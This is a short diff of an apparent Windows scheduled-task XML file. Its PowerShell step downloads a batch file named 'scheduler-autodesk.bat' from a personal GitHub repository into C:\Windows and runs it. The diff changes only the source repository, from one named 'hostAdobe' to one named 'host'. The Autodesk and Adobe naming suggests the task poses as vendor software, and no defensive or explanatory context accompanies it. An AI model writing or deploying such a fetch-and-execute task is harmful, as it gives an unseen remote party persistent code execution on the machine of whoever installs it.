@@ -46,7 +46,7 @@
     </Exec>
     <Exec>
       <Command>powershell</Command>
-      <Arguments>curl -o C:\Windows\scheduler-autodesk.bat https://raw.githubusercontent.com/minhtuan283/hostAdobe/main/scheduler-autodesk.bat</Arguments>
+      <Arguments>curl -o C:\Windows\scheduler-autodesk.bat https://raw.githubusercontent.com/minhtuan283/host/main/scheduler-autodesk.bat</Arguments>
     </Exec>
     <Exec>
       <Command>C:\Windows\scheduler-autodesk.bat</Command>
